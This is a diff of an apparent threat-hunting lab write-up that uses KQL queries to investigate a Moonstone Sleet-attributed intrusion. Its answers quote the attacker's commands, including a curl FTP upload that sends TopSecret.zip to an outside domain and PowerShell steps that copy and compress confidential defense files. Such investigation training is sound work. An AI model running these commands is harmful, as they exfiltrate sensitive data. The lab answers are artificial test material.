@@ -20,19 +20,51 @@ FileCreationEvents
 
 **Answer: 6**<br><br>
 
-**Q. **<br><br>
+**Q2. What is the Sha256 hash of the file you found?**<br><br>
 
-**Answer: ready**<br><br>
+**Answer: 09d152aa2b6261e3b0a1d1c19fa8032f215932186829cfcca954cc5e84a6cc38**<br><br>
 
-**Q. **<br><br>
+**Q3. This hash is attributed in the Microsoft Defender XDR portal to which threat actor?**<br><br>
 
-**Answer: ready**<br><br>
-**Q. **<br><br>
+**Answer: Moonstone Sleet**<br><br>
 
-**Answer: ready**<br><br>
-**Q. **<br><br>
+**Q4. What is the full process_commandline executed using this domain?**<br><br>
 
-**Answer: ready**<br><br>
-**Q. **<br><br>
+```
+ProcessEvents
+| where process_commandline has "curl" and process_commandline  has_any ("mingeloem.com","matrixane.com")
+```
+<br>
 
-**Answer: ready**<br><br>
+
+**Answer: curl -T C:\ReadyToGo\TopSecret.zip ftp://matrixane.com/upload/ --user exfil:tankpass**<br><br>
+
+
+**Q5. What is the -Path argument provided to Compress-Archive?**<br><br>
+First result returned.<br><br>
+
+```
+Compress-Archive -Path C:\StagingArea\* -DestinationPath C:\ReadyToGo\TopSecret.zip
+```
+<br>
+
+**Answer: C:\StagingArea\**<br><br>
+
+**Q6. What is the -Path argument provided to Copy-Item?**<br><br>
+
+```
+ProcessEvents
+| where process_commandline has "StagingArea"
+```
+<br>
+First result returned.<br><br>
+
+```
+Copy-Item -Path \\company_share\confidential\defense\project_omega\* -Destination C:\StagingArea\ -Recurse
+```
+<br>
+
+**Answer: \\company_share\confidential\defense\project_omega\***<br><br>
+
+**Q7. **<br><br>
+**Answer:**<br><br>
